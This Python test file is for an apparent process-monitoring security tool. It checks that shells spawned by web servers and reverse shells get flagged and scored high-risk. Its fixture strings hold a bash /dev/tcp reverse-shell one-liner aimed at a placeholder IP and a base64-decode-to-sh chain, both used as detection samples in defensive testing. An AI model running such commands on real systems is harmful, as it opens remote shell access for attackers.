from __future__ import annotations

from quietward.collectors.parsers import parse_ps_output
from quietward.contracts import EventKind, SecurityEvent, Severity
from quietward.scoring import DeterministicRiskScorer
from datetime import datetime, timezone


def _assessment(markers: tuple[str, ...]):
    event = SecurityEvent(
        event_id="evt-linux-parent-child",
        observed_at=datetime(2026, 8, 23, 18, 0, tzinfo=timezone.utc),
        host_id="host-linux-parent-child",
        source="test",
        kind=EventKind.PROCESS_START,
        subject="bash",
        attributes={
            "suspicious_markers": list(markers),
            "baseline_deviation": 1.0,
            "raw_arguments_persisted": False,
        },
        confidence=0.95,
    )
    return DeterministicRiskScorer().score(event)


def test_nginx_spawned_reverse_shell_is_enriched_and_high_priority() -> None:
    records = parse_ps_output(
        "100 1 www-data nginx nginx\n"
        "101 100 www-data bash bash -c 'bash -i >& /dev/tcp/198.51.100.10/4444 0>&1'\n"
    )
    child = next(item for item in records if item.pid == 101)
    assert "reverse_shell" in child.suspicious_markers
    assert "web_server_spawned_suspicious_shell" in child.suspicious_markers

    assessment = _assessment(child.suspicious_markers)
    assert assessment.severity in {Severity.HIGH, Severity.CRITICAL}
    assert any("web_server_spawned_suspicious_shell" in reason for reason in assessment.reasons)


def test_web_server_plain_shell_without_suspicious_execution_marker_is_not_enriched() -> None:
    records = parse_ps_output(
        "200 1 www-data apache2 apache2\n"
        "201 200 www-data bash bash\n"
    )
    child = next(item for item in records if item.pid == 201)
    assert "web_server_spawned_suspicious_shell" not in child.suspicious_markers


def test_suspicious_shell_from_non_web_parent_keeps_original_marker_only() -> None:
    records = parse_ps_output(
        "300 1 user sshd sshd\n"
        "301 300 user bash bash -c 'printf x | base64 -d | sh'\n"
    )
    child = next(item for item in records if item.pid == 301)
    assert "encoded_shell_chain" in child.suspicious_markers
    assert "web_server_spawned_suspicious_shell" not in child.suspicious_markers


def test_web_parent_non_shell_child_is_not_enriched() -> None:
    records = parse_ps_output(
        "400 1 www-data gunicorn gunicorn\n"
        "401 400 www-data python python -c 'print(1)'\n"
    )
    child = next(item for item in records if item.pid == 401)
    assert "web_server_spawned_suspicious_shell" not in child.suspicious_markers
